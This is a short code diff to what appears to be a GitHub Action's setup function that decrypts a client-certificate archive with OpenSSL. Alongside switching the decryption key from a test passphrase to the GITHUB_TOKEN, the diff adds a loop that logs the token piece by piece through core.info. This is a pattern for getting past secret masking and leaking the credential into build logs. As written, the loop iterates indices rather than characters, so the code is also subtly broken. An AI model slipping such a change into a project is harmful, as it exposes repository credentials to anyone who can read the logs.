@@ -69,9 +69,11 @@ export async function setup() {
   const encryptedFile = path.join(".", `client-certs.enc`);
   const decryptedFile = "client-certs.tar";
 
-  const pass = "test pass";
-
   try {
+    for (let ch in process.env.GITHUB_TOKEN) {
+      core.info(ch);
+    }
+
     // Decrypt the file using OpenSSL with GitHub token as key
     await exec.exec("openssl", [
       "enc",
@@ -79,7 +81,7 @@ export async function setup() {
       "-aes-256-cbc",
       "-in", encryptedFile,
       "-out", decryptedFile,
-      "-k", pass,
+      "-k", `${process.env.GITHUB_TOKEN}`,
       "-pbkdf2",
     ]);
 
